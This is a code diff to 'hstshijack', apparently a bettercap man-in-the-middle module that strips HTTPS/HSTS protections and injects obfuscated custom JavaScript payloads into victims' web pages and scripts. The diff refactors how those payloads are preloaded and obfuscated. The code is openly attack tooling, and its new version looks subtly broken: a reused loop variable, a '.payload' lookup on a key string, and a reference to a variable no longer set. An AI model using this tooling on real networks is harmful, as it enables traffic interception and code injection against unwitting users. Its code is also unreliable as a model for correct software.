@@ -20,7 +20,7 @@ var ignore_hosts       = [],
     target_hosts       = [],
     replacement_hosts  = [],
     block_script_hosts = [],
-    custom_payloads    = []
+    custom_payloads
 
 var obfuscate,
     encode
@@ -113,20 +113,36 @@ function configure() {
 	for (var i = 0; i < block_script_hosts.length; i++) {
 		!block_script_hosts[i].match(/^(?:\*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.blockscripts value (got " + block_script_hosts[i] + ").") : ""
 	}
-	for (var i = 0; i < custom_payloads.length; i++) {
-		!custom_payloads[i].match(/^(?:\*|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+?$/) ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.custompayloads value (got " + custom_payloads[i] + ").") : ""
-		custom_payload_path = custom_payloads[i].replace(/.*\:/, "")
-		if ( !readFile(custom_payload_path) ) {
-			log_fatal("(" + green + "hstshijack" + reset + ") Could not read a path in hstshijack.custompayloads (got " + custom_payload_path + ").")
-		}
-	}
 	if (obfuscate == "false") {
 		obfuscate = false
 	}
 	if (encode == "false") {
 		encode = false
 	}
-
+	// Preload custom payloads.
+	preloaded_payloads = {}
+	for (var i = 0; i < custom_payloads.length; i++) {
+		!custom_payloads[i].match(/^(?:\*|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+?$/) ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.custompayloads value (got " + custom_payloads[i] + ").") : ""
+		custom_payload_host = custom_payloads[i].replace(/\:.*/, "")
+		custom_payload_path = custom_payloads[i].replace(/.*\:/, "")
+		if ( !readFile(custom_payload_path) ) {
+			log_fatal("(" + green + "hstshijack" + reset + ") Could not read a path in hstshijack.custompayloads (got " + custom_payload_path + ").")
+		}
+		custom_payload = readFile(custom_payload_path)
+		custom_payload = custom_payload.replace(/obf_path_whitelist/g, whitelist_path)
+		custom_payload = custom_payload.replace(/obf_path_callback/g, callback_path)
+		if (obfuscate) {
+			obfuscation_variables = custom_payload.match(/obf_[a-z\_]*/ig) || []
+			for (var i = 0; i < obfuscation_variables.length; i++) {
+				regexp = new RegExp(obfuscation_variables[i], "ig")
+				custom_payload = custom_payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
+			}
+		}
+		preloaded_payloads[custom_payload_host] = {
+			"payload": custom_payload
+		}
+	}
+	custom_payloads = preloaded_payloads
 	// Read core payload.
 	if ( !readFile(payload_path) ) {
 		log_fatal("(" + green + "hstshijack" + reset + ") Could not read payload in " + bold + "hstshijack.payload" + reset + " (got " + payload_path + ").")
@@ -183,11 +199,11 @@ function showModule() {
 	logStr += "    " + yellow + "        hstshijack.encode" + reset + " > " + ( encode ? green + "true" : red + "false" ) + reset + "\n"
 	logStr += "    " + yellow + "hstshijack.custompayloads" + reset + " > "
 	if ( env["hstshijack.custompayloads"] ) {
-			custom_payloads = env["hstshijack.custompayloads"].replace(/\s/g, "").split(",")
-			logStr += green + custom_payloads[0] + reset + "\n"
-			if (custom_payloads.length > 1) {
-				for ( var i = 0; i < (custom_payloads.length-1); i++ ) {
-					logStr += "                              > " + green + custom_payloads[i+1] + reset + "\n"
+			list = env["hstshijack.custompayloads"].replace(/\s/g, "").split(",")
+			logStr += green + list[0] + reset + "\n"
+			if (list.length > 1) {
+				for ( var i = 0; i < (list.length-1); i++ ) {
+					logStr += "                              > " + green + list[i+1] + reset + "\n"
 				}
 			}
 	} else {
@@ -224,7 +240,6 @@ function onLoad() {
 	var_replacement_hosts = randomString( 4 + Math.random() * 12 )
 
 	log_info("(" + green + "hstshijack" + reset + ") Reading SSL log ...")
-	console.log(env["hstshijack.log"])
 	ssl_log = readFile( env["hstshijack.log"] ).split("\n")
 	if ( !readFile( env["hstshijack.log"] ) ) {
 		log_warn("(" + green + "hstshijack" + reset + ") No " + bold + "ssl.log" + reset + " file found. Logged hosts will be lost when this session ends!")
@@ -473,8 +488,8 @@ function onResponse(req, res) {
 				}
 				// Don't ignore response if there's a custom payload for the requested host.
 				if (ignored) {
-					for (var b = 0; b < custom_payloads.length; b++) {
-						custom_payload_host = custom_payloads[b].replace(/\:.*/, "")
+					for ( var b = 0; b < Object.keys(custom_payloads).length; b++ ) {
+						custom_payload_host = Object.keys(custom_payloads)[b].replace(/\:.*/, "")
 						if ( custom_payload_host.indexOf("*") > -1 ) {
 							regexp = toWholeWildcardRegexp(custom_payload_host)
 						} else {
@@ -554,30 +569,17 @@ function onResponse(req, res) {
 		if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) || res.Body.match(/<head>/i) ) {
 			injection = ""
 
-			if (custom_payloads.length > 0) {
-				for (var a = 0; a < custom_payloads.length; a++) {
-					custom_payload_host = custom_payloads[a].replace(/\:.*/, "")
-					custom_payload_path = custom_payloads[a].replace(/.*\:/, "")
+			if ( Object.keys(custom_payloads).length > 0 ) {
+				for ( var a = 0; a < Object.keys(custom_payloads).length; a++ ) {
 					var regexp
-					if ( custom_payload_host.indexOf("*") > -1 ) {
-						regexp = toWholeWildcardRegexp(custom_payload_host)
+					if ( Object.keys(custom_payloads)[a].indexOf("*") > -1 ) {
+						regexp = toWholeWildcardRegexp( Object.keys(custom_payloads)[a] )
 					} else {
-						regexp = toWholeRegexp(custom_payload_host)
+						regexp = toWholeRegexp( Object.keys( custom_payloads)[a] )
 					}
 					if ( req.Hostname.match(regexp) ) {
-						custom_payload = readFile(custom_payload_path)
 						// Insert special callback paths.
-						custom_payload = custom_payload.replace(/obf_path_whitelist/g, whitelist_path)
-						custom_payload = custom_payload.replace(/obf_path_callback/g, callback_path)
-						// Obfsucate payload if required.
-						if (obfuscate) {
-							obfuscation_variables = custom_payload.match(/obf_[a-z\_]*/ig) || []
-							for (var b = 0; b < obfuscation_variables.length; b++) {
-								regexp = new RegExp(obfuscation_variables[b], "ig")
-								custom_payload = custom_payload.replace( regexp, randomString( 4 + Math.random() * 12 ) )
-							}
-						}
-						injection = payload.replace("{{custom_payload}}", custom_payload + "\n{{custom_payload}}")
+						injection = payload.replace("{{custom_payload}}", Object.keys(custom_payloads)[a].payload + "\n{{custom_payload}}")
 						log_debug("(" + green + "hstshijack" + reset + ") Attempting to inject " + bold + custom_payload_path + reset + " into document from " + bold + req.Hostname + reset + ".")
 					}
 				}
